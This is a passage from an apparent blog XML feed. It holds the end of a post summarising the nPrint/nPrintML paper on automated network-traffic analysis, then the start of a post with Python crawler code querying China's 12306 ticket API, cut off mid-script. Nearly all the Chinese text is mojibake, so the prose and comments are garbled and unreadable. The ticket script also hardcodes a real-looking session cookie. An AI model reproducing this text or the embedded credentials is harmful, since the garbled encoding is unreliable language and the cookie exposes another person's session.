”ç©¶äººå‘˜é‡æ–°è€ƒè™‘è°ƒæ•´è¿™äº›é€‰é¡¹ç”šè‡³é‡æ–°å»ºæ¨¡ï¼Œè¿™ä¸ªè°ƒæ•´ç”šè‡³æ˜¯é‡å»ºçš„è¿‡ç¨‹å¾€å¾€éœ€è¦å¤§é‡äººåŠ›æˆæœ¬å’Œä¸“ä¸šçŸ¥è¯†ã€‚å¹¶ä¸”ï¼Œæµé‡æ¨¡å¼ä¼šä¸æ–­çš„å‘ç”Ÿå˜åŒ–ï¼Œä½¿å¾—æ¨¡å‹å’Œäººå·¥æå–çš„ç‰¹å¾è¿‡æ—¶ã€‚å› æ­¤æœ‰å¿…è¦ä¸ºä¸åŒç½‘ç»œæµé‡åˆ›å»ºä¸€ä¸ªé€šç”¨çš„è¡¨ç¤ºï¼Œå¯ä»¥ç”¨äºå„ç§ä¸åŒçš„æ¨¡å‹ï¼Œè·¨è¶Šå¹¿æ³›çš„é—®é¢˜ç±»ï¼Œå¹¶å°†æ•´ä¸ªå»ºæ¨¡è¿‡ç¨‹è‡ªåŠ¨åŒ–ã€‚è¯¥æ–‡å…³æ³¨é€šç”¨çš„è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æé—®é¢˜ï¼Œè‡´åŠ›äºä½¿ç ”ç©¶äººå‘˜å°†æ›´å¤šçš„ç²¾åŠ›ç”¨äºä¼˜åŒ–æ¨¡å‹å’Œç‰¹å¾ä¸Šï¼Œå¹¶æœ‰æ›´å¤šçš„æ—¶é—´åœ¨å®è·µä¸­è§£é‡Šå’Œéƒ¨ç½²æœ€ä½³æ¨¡å‹ã€‚</p><h2 id="è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æ"><a href="#è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æ" class="headerlink" title="è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æ"></a>è‡ªåŠ¨åŒ–ç½‘ç»œæµé‡åˆ†æ</h2><p>æœ¬æ–‡æå‡ºä¸€ç§è‡ªåŠ¨åŒ–æµé‡åˆ†ææ–¹æ³•ï¼ˆnPrintMLï¼‰ï¼Œä½¿æœºå™¨å­¦ä¹ æŠ€æœ¯æ›´å®¹æ˜“åº”ç”¨äºæ›´å¹¿æ³›çš„æµé‡åˆ†æä»»åŠ¡ã€‚nPrintML åŒ…å« nPrint æµé‡è¡¨ç¤ºå’Œ AutoML ä¸¤éƒ¨åˆ†ï¼Œé¦–å…ˆ nPrint é€šè¿‡å¯¹ IP æ•°æ®åŒ…å¤´è¿›è¡Œå¯¹é½å’Œæ‹¼æ¥å½¢æˆç»Ÿä¸€çš„æ•°æ®è¡¨å¾ï¼Œç„¶åä½¿ç”¨ AutoGluon-Tabular æ¡†æ¶è¿›è¡Œè‡ªåŠ¨åŒ–çš„è¿›è¡Œç‰¹å¾æå–ã€æ¨¡å‹æœç´¢å’Œè¶…å‚æ•°ä¼˜åŒ–ã€‚ä½œè€…åœ¨ 8 ä¸ªä¸åŒçš„æµé‡åˆ†æä»»åŠ¡ä¸Šå¯¹ nPrintML è¿›è¡Œè¯„ä¼°ï¼Œéƒ½å–å¾—äº†å¾ˆå¥½çš„æ•ˆæœã€‚</p><h2 id="æ•°æ®è¡¨ç¤º-nPrint"><a href="#æ•°æ®è¡¨ç¤º-nPrint" class="headerlink" title="æ•°æ®è¡¨ç¤º nPrint"></a>æ•°æ®è¡¨ç¤º nPrint</h2><p>å¯¹äºæµé‡åˆ†ç±»é—®é¢˜ï¼Œæ•°æ®è¡¨ç¤ºä¸æ¨¡å‹é€‰æ‹©åŒç­‰é‡è¦ï¼Œæ‰€ä»¥åœ¨åº”ç”¨æœºå™¨å­¦ä¹ æ–¹æ³•æ—¶ï¼Œå¦‚ä½•å¯¹æ•°æ®è¿›è¡Œè¡¨ç¤ºå’Œç¼–ç æ˜¯éå¸¸é‡è¦çš„ä¸€ç¯ã€‚å¯¹äºç½‘ç»œæµé‡æ•°æ®çš„ç¼–ç éœ€è¦æ»¡è¶³ä»¥ä¸‹4ä¸ªè¦æ±‚ï¼š</p><ul><li>å®Œæ•´çš„è¡¨ç¤ºã€‚æˆ‘ä»¬çš„ç›®æ ‡ä¸æ˜¯é€‰æ‹©ç‰¹å®šçš„ç‰¹å¾ï¼Œè€Œæ˜¯ä¸€ç§ç»Ÿä¸€çš„æ•°æ®ç¼–ç ï¼Œä»¥é¿å…ä¾èµ–ä¸“å®¶çŸ¥è¯†ï¼Œæ‰€ä»¥éœ€è¦ä¿ç•™åŒ…å«åŒ…å¤´åœ¨å†…çš„æ‰€æœ‰æ•°æ®åŒ…ä¿¡æ¯ï¼›</li><li>å›ºå®šçš„å¤§å°ã€‚è®¸å¤šæœºå™¨å­¦ä¹ æ¨¡å‹çš„è¾“å…¥æ€»æ˜¯ä¿æŒç›¸åŒçš„å¤§å°ï¼Œæ‰€ä»¥æ¯ä¸ªæ•°æ®åŒ…è¡¨ç¤ºéƒ½å¿…é¡»æ˜¯å¸¸é‡å¤§å°ï¼›</li><li>å›ºæœ‰çš„è§„èŒƒåŒ–ã€‚å½“ç‰¹å¾è¢«å½’ä¸€åŒ–åï¼Œæœºå™¨å­¦ä¹ æ¨¡å‹é€šå¸¸ä¼šè¡¨ç°å¾—æ›´å¥½ï¼Œä¹Ÿèƒ½å‡å°‘è®­ç»ƒæ—¶é—´å¹¶å¢åŠ æ¨¡å‹çš„ç¨³å®šæ€§ï¼Œæ‰€ä»¥å¦‚æœæ•°æ®çš„åˆå§‹è¡¨ç¤ºæœ¬èº«å°±æ˜¯è§„èŒƒåŒ–çš„ï¼Œå°†ä¼šéå¸¸æ–¹ä¾¿ï¼›</li><li>ä¸€è‡´çš„è¡¨ç¤ºã€‚æ•°æ®è¡¨ç¤ºçš„æ¯ä¸ªä½ç½®éƒ½åº”è¯¥å¯¹åº”äºæ‰€æœ‰æ•°æ®åŒ…åŒ…å¤´çš„ç›¸åŒéƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿åè®®å’ŒæŠ¥æ–‡é•¿åº¦ä¸åŒï¼Œç‰¹å®šçš„ç‰¹å¾æ€»æ˜¯åœ¨æ•°æ®åŒ…ä¸­å…·æœ‰ç›¸åŒçš„åç§»é‡ï¼Œå¯¹é½åçš„æ•°æ®éƒ½èƒ½è®©æ¨¡å‹åŸºäºè¿™æ ·çš„å‰ææ¥å­¦ä¹ ç‰¹å¾è¡¨ç¤ºã€‚</li></ul><p>é¦–å…ˆï¼Œæ¥çœ‹ä¸€ä¸‹ä¼ ç»Ÿçš„æµé‡æ•°æ®åŒ…å¤´ã€‚</p><p><img src="https://s2.loli.net/2022/04/06/jIkEbltCHMYh9sR.png" alt="1.png"></p><p>â€‹                                                      å›¾1 è¯­ä¹‰è¡¨ç¤ºæ³•å’Œæœ´ç´ äºŒè¿›åˆ¶è¡¨ç¤ºæ³•</p><p>å¦‚å›¾1æ‰€ç¤ºï¼Œç½‘ç»œæµé‡è¡¨ç¤ºçš„ä¸»è¦æ–¹å¼åŒ…æ‹¬è¯­ä¹‰è¡¨ç¤ºæ³•å’Œæœ´ç´ äºŒè¿›åˆ¶è¡¨ç¤ºæ³•ã€‚</p><ul><li>è¯­ä¹‰è¡¨ç¤ºæ³•ï¼šæ¯ä¸ªæŠ¥å¤´éƒ½æœ‰å„è‡ªçš„è¯­ä¹‰å­—æ®µï¼Œä½†å®ƒä¸ä¿ç•™å…·æœ‰åŒºåˆ†åº¦çš„å¯é€‰å­—æ®µçš„é¡ºåºï¼ŒåŒæ—¶éœ€è¦é¢†åŸŸä¸“ä¸šçŸ¥è¯†æ¥è§£ææ¯ä¸ªåè®®çš„è¯­ä¹‰ç»“æ„ï¼Œå³ä½¿æ‹¥æœ‰è¿™äº›çŸ¥è¯†ï¼Œåç»­ä¹Ÿè¿˜æ˜¯ä¸å¯é¿å…è¿›è¡Œç¹ççš„ç‰¹å¾å·¥ç¨‹ï¼›</li><li>æœ´ç´ äºŒè¿›åˆ¶è¡¨ç¤ºæ³•ï¼šä½¿ç”¨æ•°æ®åŒ…çš„åŸå§‹ä½å›¾è¡¨ç¤ºæ¥ä¿æŒé¡ºåºï¼Œä½†æ˜¯å¿½ç•¥äº†ä¸åŒçš„å¤§å°å’Œåè®®ï¼Œå¯¼è‡´ä¸¤ä¸ªæ•°æ®åŒ…çš„ç‰¹å¾å‘é‡å¯¹åŒä¸€ç‰¹å¾å…·æœ‰ä¸åŒçš„å«ä¹‰ï¼Œè¿™ç§ä¸å¯¹é½å¯èƒ½ä¼šåœ¨é‡è¦ç‰¹å¾çš„åœ°æ–¹å¼•å…¥å™ªå£°è€Œé™ä½æ¨¡å‹æ€§èƒ½ï¼ŒåŒæ—¶ä¹Ÿå› ä¸ºæ— æ³•å°†æ¯ä¸€ä½éƒ½æ˜ å°„åˆ°è¯­ä¹‰ä¸Šè€Œå¯¼è‡´ä¸å¯è§£é‡Šã€‚</li></ul><p>ä»å›¾1ä¸­ä¸éš¾çœ‹å‡ºï¼Œä¸åŒçš„ç½‘ç»œåè®®ï¼ˆå¦‚ TCP å’Œ UDPï¼‰æœ‰ç€ä¸åŒçš„æ•°æ®è¡¨ç¤ºæ–¹æ¡ˆï¼Œç”šè‡³ç›¸åŒçš„ç½‘ç»œåè®®ï¼ˆå¦‚ IPï¼‰ä¹Ÿä¸ç›¸åŒï¼ˆæ˜¯å¦åŒ…å« Options é€‰é¡¹ï¼‰ï¼Œè¿™æ˜¾ç„¶æ— æ³•æ»¡è¶³ä¸Šè¿°ç»Ÿä¸€åŒ–æ•°æ®è¡¨ç¤ºçš„éœ€æ±‚ã€‚å› æ­¤ï¼Œç ”ç©¶äººå‘˜ç»“åˆè¯­ä¹‰è¡¨ç¤ºæ³•å’Œæœ´ç´ äºŒè¿›åˆ¶è¡¨ç¤ºæ³•æå‡ºä¸€ç§ç»Ÿä¸€çš„ç½‘ç»œæ•°æ®åŒ…è¡¨ç¤ºæ–¹æ³•<strong>nPrint</strong>ï¼ˆå›¾ 2ï¼‰ã€‚</p><p><img src="https://s2.loli.net/2022/04/06/wqXfR7yOADHzLxQ.png" alt="2.png"></p><p>â€‹                                                                                    å›¾2 nPrint</p><p>nPrint ä½¿ç”¨æ¯ç§åè®®å…è®¸çš„æœ€å¤§åŒ…å¤´é•¿åº¦æ¥è¡¨ç¤ºè¯¥åè®®ï¼ŒåŒæ—¶å°†ä¸åŒåè®®å¤´éƒ¨æ‹¼æ¥ç»„åˆæˆå›ºå®šé•¿åº¦çš„åŒ…å¤´ã€‚é¦–å…ˆï¼Œå®ƒä¼šä¿è¯ä»»ä½•æ•°æ®åŒ…éƒ½å¯ä»¥è¢«å®Œæ•´è¡¨ç¤ºè€Œä¸ä¸¢å¤±ä»»ä½•ä¿¡æ¯ï¼›ç„¶åï¼Œä½¿ç”¨å†…éƒ¨å¡«å……ç¡®ä¿æ¯ä¸ªæ•°æ®åŒ…ä»¥ç›¸åŒæ•°é‡çš„ç‰¹å¾è¡¨ç¤ºï¼Œå¹¶ä¸”æ¯ä¸ªç‰¹å¾å…·æœ‰ç›¸åŒå«ä¹‰ï¼Œè¿™ç§åœ¨ä½çº§ä¸Šå¯è§£é‡Šçš„è¡¨ç¤ºä½¿æˆ‘ä»¬èƒ½å¤Ÿæ›´å¥½çš„ç†è§£æ¨¡å‹ï¼›å…¶æ¬¡ï¼Œç›´æ¥ä½¿ç”¨æ•°æ®åŒ…çš„ä½ï¼ŒåŒºåˆ†äºæŸä¸ªä½è¢«è®¾ç½®ä¸º0ï¼Œå°†ä¸å­˜åœ¨çš„åŒ…å¤´ç”¨-1å¡«å……ï¼›æœ€åï¼Œæ¯ä¸ªæ•°æ®åŒ…éƒ½ç”¨ç›¸åŒæ•°é‡çš„ç‰¹å¾è¡¨ç¤ºï¼Œå¯¹äºç»™å®šçš„ç½‘ç»œæµé‡åˆ†æä»»åŠ¡ï¼Œå°†è½½è·è®¾ç½®ä¸ºå¯é€‰çš„å­—èŠ‚æ•°ã€‚æ­¤å¤–ï¼ŒnPrintå…·æœ‰æ¨¡å—åŒ–å’Œå¯æ‰©å±•çš„ç‰¹æ€§ï¼Œä¸ä»…å¯ä»¥å°†å…¶ä»–åè®®æ·»åŠ åˆ°è¡¨ç¤ºä¸­ï¼Œä¹Ÿå¯ä»¥å°†ä¸€ç»„æ•°æ®åŒ…è¡¨ç¤ºä¸²è”èµ·æ¥æ„å»ºå¤šåŒ…çš„nPrintæŒ‡çº¹ã€‚</p><p>å› æ­¤ï¼ŒnPrint ç¬¦åˆäº†4å¤§æ€§è´¨ï¼š</p><ul><li>å®Œæ•´æ€§ï¼šç†è®ºä¸Šå¯ä»¥åŒ…å«æ‰€æœ‰åè®®</li><li>ä¸å˜æ€§ï¼šæ•°æ®è¡¨å¾å¯ä»¥æ˜¯ä¸€ä¸ªç¡®å®šçš„é•¿åº¦</li><li>å½’ä¸€æ€§ï¼šæ•°æ®è¢«è¡¨ç¤ºä¸º 1&#x2F;0&#x2F;-1</li><li>ä¸€è‡´æ€§ï¼šä¸åŒæ•°æ®åŒ…å¤´çš„åŒä¸€é€‰é¡¹åœ¨åŒä¸€ä½ç½®</li></ul><h2 id="nPrintML"><a href="#nPrintML" class="headerlink" title="nPrintML"></a>nPrintML</h2><p>ä½œè€…å°† nPrint ä¸ <a href="https://arxiv.org/abs/2003.06505">AutoGluon-Tabular</a> æ¡†æ¶ç›¸ç»“åˆï¼Œæå‡º nPrintMLï¼Œå®ç°äº†å®ç°äº†æœºå™¨å­¦ä¹ æµç¨‹çš„è‡ªåŠ¨åŒ–ï¼ˆå¦‚å›¾3æ‰€ç¤ºï¼‰ã€‚</p><p><img src="https://s2.loli.net/2022/04/06/BqpVTEaQ8eo3gY4.png" alt="3.png"></p><p>â€‹                                                                             å›¾3 nPrintML</p><blockquote><p>AutoGluonèƒŒåæŠ€æœ¯ï¼š<a href="https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0</a></p><p>AutoGluonåœ¨Windowsä¸‹å®‰è£…ï¼š<a href="https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788">https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788</a></p><p>è®ºæ–‡ï¼š<a href="https://arxiv.org/abs/2003.06505">https://arxiv.org/abs/2003.06505</a> </p><p>æ–‡æ¡£ï¼š<a href="https://auto.gluon.ai/">https://auto.gluon.ai/</a> </p><p>ä»£ç ï¼š<a href="https://github.com/awslabs/autogluon">https://github.com/awslabs/autogluon</a></p></blockquote><h2 id="å®éªŒç»“æœ"><a href="#å®éªŒç»“æœ" class="headerlink" title="å®éªŒç»“æœ"></a>å®éªŒç»“æœ</h2><h3 id="æ€»è§ˆ"><a href="#æ€»è§ˆ" class="headerlink" title="æ€»è§ˆ"></a>æ€»è§ˆ</h3><p>é’ˆå¯¹8ä¸ªç½‘ç»œæµé‡åˆ†æåœºæ™¯ï¼Œå›¾4å±•ç¤ºäº†ç”¨nPrintMLè¿›è¡Œåˆ†æçš„æ¡ˆä¾‹ç ”ç©¶ï¼Œå®éªŒç»“æœè¡¨æ˜ï¼ŒnPrintMLä¸ä»…å¯ä»¥è§£å†³ä¸åŒåœºæ™¯çš„ç½‘ç»œæµé‡åˆ†æé—®é¢˜ï¼Œå¹¶ä¸”å…·æœ‰ç›¸è¾ƒäºä¼ ç»Ÿæ–¹æ³•æ›´å¥½çš„æ€§èƒ½ã€‚</p><p><img src="https://s2.loli.net/2022/04/06/uA3FM5Z7yNBGqLm.png" alt="4.png"></p><p>â€‹                                                                                  å›¾4 å®éªŒç»“æœæ€»è§ˆ</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å°†æœºå™¨å­¦ä¹ åº”ç”¨äºç½‘ç»œå®‰å…¨ä¸­çš„æµé‡åˆ†æä»»åŠ¡çš„æœ‰æ•ˆæ€§å–å†³äºç‰¹å¾çš„é€‰æ‹©å’Œé€‚å½“çš„è¡¨ç¤ºï¼Œå³ä¸è¶…è¿‡æ¨¡å‹æœ¬èº«ã€‚æœ¬æ–‡ä¸ºè‡ªåŠ¨æµé‡åˆ†æåˆ›å»ºäº†ä¸€ä¸ªæ–°æ–¹å‘ï¼Œæå‡ºäº† nPrintï¼Œè¿™æ˜¯ä¸€ç§ç»Ÿä¸€çš„æ•°æ®åŒ…è¡¨ç¤ºï¼Œå®ƒå°†åŸå§‹ç½‘ç»œæ•°æ®åŒ…ä½œä¸ºè¾“å…¥ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºé€‚åˆè¡¨ç¤ºå­¦ä¹ å’Œæ¨¡å‹è®­ç»ƒçš„æ ¼å¼ï¼Œä»è€Œä½¿æœºå™¨å­¦ä¹ è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†è‡ªåŠ¨åŒ–åˆ°ç›®å‰ä¸ºæ­¢ï¼Œè¿™åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯è‰°è‹¦çš„å’Œæ‰‹åŠ¨çš„ã€‚è¿™ç§æ ‡å‡†æ ¼å¼å¯ä»¥è½»æ¾åœ°å°†ç½‘ç»œæµé‡åˆ†æä¸æœ€å…ˆè¿›çš„è‡ªåŠ¨æœºå™¨å­¦ä¹  (AutoML) ç®¡é“é›†æˆã€‚ nPrintML æ˜¯ nPrint ä¸ AutoML çš„é›†æˆï¼Œå¯è‡ªåŠ¨å­¦ä¹ ç›¸åº”ä»»åŠ¡çš„æœ€ä½³æ¨¡å‹ã€å‚æ•°è®¾ç½®å’Œç‰¹å¾è¡¨ç¤ºã€‚æœ¬æ–‡ä½œè€…ä»¬å°† nPrintML åº”ç”¨äºå…«ç§å¸¸è§çš„ç½‘ç»œæµé‡åˆ†æä»»åŠ¡ï¼Œåœ¨è®¸å¤šæƒ…å†µä¸‹æ”¹è¿›äº†æœ€æ–°æŠ€æœ¯ã€‚ nPrint å·²ç»è¯æ˜ï¼Œè®¸å¤šç½‘ç»œæµé‡åˆ†ç±»ä»»åŠ¡éƒ½å¯ä»¥è‡ªåŠ¨åŒ–ï¼Œå°½ç®¡å­˜åœ¨è®¸å¤šæœªè§£å†³çš„é—®é¢˜ï¼Œä¾‹å¦‚æ¶‰åŠå¤šä¸ªæµçš„è‡ªåŠ¨æ—¶é—´åºåˆ—åˆ†æå’Œåˆ†ç±»ã€‚ nPrint æœ€ç»ˆåº”è¯¥åº”ç”¨äºæ›´å¤§çš„åˆ†ç±»é—®é¢˜é›†ã€‚</p><h2 id="ä»£ç é˜…è¯»åŠå¤ç°"><a href="#ä»£ç é˜…è¯»åŠå¤ç°" class="headerlink" title="ä»£ç é˜…è¯»åŠå¤ç°"></a>ä»£ç é˜…è¯»åŠå¤ç°</h2><p>(è¿‡ä¸¤å¤©å†åšâ€¦â€¦)</p><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><p>[1] Nick Erickson, Jonas Mueller, Alexander Shirkov, Hang Zhang, Pedro Larroy, Mu Li, and Alexander Smola. 2020. AutoGluon-Tabular: Robust and Accurate AutoML for Structured Data. arXiv preprint arXiv:2003.06505 (2020).</p><p>[2] Holland J , Schmitt P , Feamster N , et al. New Directions in Automated Traffic Analysis. 2021 ACMComputer and Communications Security Conference [C]. 2021.</p><p>[3] <a href="https://blog.csdn.net/WellShark/article/details/122192656">https://blog.csdn.net/WellShark/article/details/122192656</a></p><p>[4] <a href="https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg">https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg</a></p>]]></content>
      
      
      <categories>
          
          <category> è®ºæ–‡å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> è®ºæ–‡ </tag>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> å…¥ä¾µæ£€æµ‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonçˆ¬è™«</title>
      <link href="/2022/04/06/python-crawler/"/>
      <url>/2022/04/06/python-crawler/</url>
      
        <content type="html"><![CDATA[<h3 id="Pythonçˆ¬è™«å­¦ä¹ "><a href="#Pythonçˆ¬è™«å­¦ä¹ " class="headerlink" title="Pythonçˆ¬è™«å­¦ä¹ "></a>Pythonçˆ¬è™«å­¦ä¹ </h3><p>æ•´ç†äº†ä¸€ä¸‹ä»¥å‰å†™è¿‡çš„ä¸€äº›å°çˆ¬è™«ã€‚</p><h4 id="12306æŸ¥ç¥¨"><a href="#12306æŸ¥ç¥¨" class="headerlink" title="12306æŸ¥ç¥¨"></a>12306æŸ¥ç¥¨</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 12306Check.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># åå¤æŸ¥è¯¢åŠ å¾ªç¯å³å¯</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stations.json&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">text = f.read()</span><br><span class="line">city_json = json.loads(text)</span><br><span class="line">f.close()</span><br><span class="line">from_station = <span class="built_in">input</span>(<span class="string">&#x27;å§‹å‘ç«™ï¼š&#x27;</span>)</span><br><span class="line">to_station = <span class="built_in">input</span>(<span class="string">&#x27;ç»ˆç‚¹ç«™ï¼š&#x27;</span>)</span><br><span class="line">train_date = <span class="built_in">input</span>(<span class="string">&#x27;å‘è½¦æ—¥æœŸï¼ˆæ ¼å¼ï¼š2022-04-03ï¼‰ï¼š&#x27;</span>)</span><br><span class="line"><span class="comment"># from_station = &#x27;æ­¦æ±‰&#x27;</span></span><br><span class="line"><span class="comment"># to_station = &#x27;é•¿æ²™&#x27;</span></span><br><span class="line"><span class="comment"># train_date = &#x27;2022-04-06&#x27;</span></span><br><span class="line"><span class="comment"># print(city_json[from_station])</span></span><br><span class="line"><span class="comment"># print(city_json[to_station])</span></span><br><span class="line"><span class="comment"># print(train_date)</span></span><br><span class="line">url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.train_date&#x27;</span>: train_date,</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.from_station&#x27;</span>: city_json[from_station],</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.to_station&#x27;</span>: city_json[to_station],</span><br><span class="line"><span class="string">&#x27;purpose_codes&#x27;</span>: <span class="string">&#x27;ADULT&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;_uab_collina=164896135403377792450208; JSESSIONID=843F9AA2FC700ED2B8E8655CBA8E4AFD; BIGipServerotn=468713994.50210.0000; BIGipServerpool_passport=182714890.50215.0000; highContrastMode=defaltMode; guidesStatus=off; cursorStatus=off; RAIL_EXPIRATION=1649305414970; RAIL_DEVICEID=i7hoNlwMechBKbH0Ghsk6cswUh1nhyGKgfThBDYYiAGy_zBKBevr3wq6zqlS1GV-JvK0B-qVEYwihXSg-WVTUlOcG7NgUJc2INRx-UN6MMxdgg6sumeKjo2NXUwAOlNL7uSajwkmH4Aleee-puGjfAVFL2aVyYMY; route=9036359bb8a8a461c164a04f8f50b252; _jc_save_toStation=%u957F%u6C99%2CCSQ; _jc_save_fromDate=2022-04-03; _jc_save_toDate=2022-04-03; _jc_save_wfdc_flag=dc; _jc_save_fromStation=%u6B66%u6C49%2CWHN&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,params=data,headers=headers)</span><br><span class="line"><span class="comment"># &lt;Response [200]&gt; è·å–å“åº”ä½“å¯¹è±¡</span></span><br><span class="line"><span class="comment"># response.text è·å–å“åº”ä½“çš„æ–‡æœ¬æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¹±ç æ—¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•</span></span><br><span class="line"><span class="comment"># response.encoding = &#x27;utf-8&#x27; #æŒ‡å®šutf-8</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#è‡ªåŠ¨è½¬ç </span></span><br><span class="line">result = response.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;result&#x27;</span>]</span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> result:</span><br><span class="line">index_list = index.replace(<span class="string">&#x27;æœ‰&#x27;</span>,<span class="string">&#x27;Yes&#x27;</span>).replace(<span class="string">&#x27;æ— &#x27;</span>,<span class="string">&#x27;No&#x27;</span>).split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="comment"># index_list = index.split(&#x27;|&#x27;)</span></span><br><span class="line">TrainNum = index_list[<span class="number">3</span>]</span><br><span class="line">StartTime = index_list[<span class="number">8</span>]</span><br><span class="line">EndTime = index_list[<span class="number">9</span>]</span><br><span class="line">UseTime = index_list[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;G&#x27;</span> <span class="keyword">in</span> TrainNum):</span><br><span class="line">BussinessSeats = index_list[<span class="number">32</span>] <span class="comment">#å•†åŠ¡åº§</span></span><br><span class="line">FirstSeats = index_list[<span class="number">31</span>] <span class="comment">#ä¸€ç­‰åº§</span></span><br><span class="line">SecondSeats = index_list[<span class="number">30</span>] <span class="comment">#äºŒç­‰åº§</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: BussinessSeats,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: FirstSeats,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: SecondSeats,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">SoftBeds = index_list[<span class="number">23</span>] <span class="comment">#è½¯å§</span></span><br><span class="line">HardBeds = index_list[<span class="number">28</span>] <span class="comment">#ç¡¬å§</span></span><br><span class="line">HardSeats = index_list[<span class="number">29</span>] <span class="comment">#ç¡¬åº§</span></span><br><span class="line">NoSeats = index_list[<span class="number">26</span>] <span class="comment">#æ— åº§</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: SoftBeds,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: HardBeds,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: HardSeats,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: NoSeats</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(di)</span></span><br><span class="line">lis.append(di)</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_rows&#x27;</span>,<span class="literal">None</span>) <span class="comment">#å±•ç¤ºæœ€å¤§åŒ–ï¼ŒæŠŠæ‰€æœ‰è¡Œå±•ç¤ºå‡ºæ¥</span></span><br><span class="line">content = pd.DataFrame(lis)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/fDMaIr74u2E1OZn.png" alt="image-20220406083305519.png"></p><p>ç”Ÿæˆstations.jsonæ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_station_code.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResponse</span>(<span class="params">url</span>):</span><br><span class="line">    <span 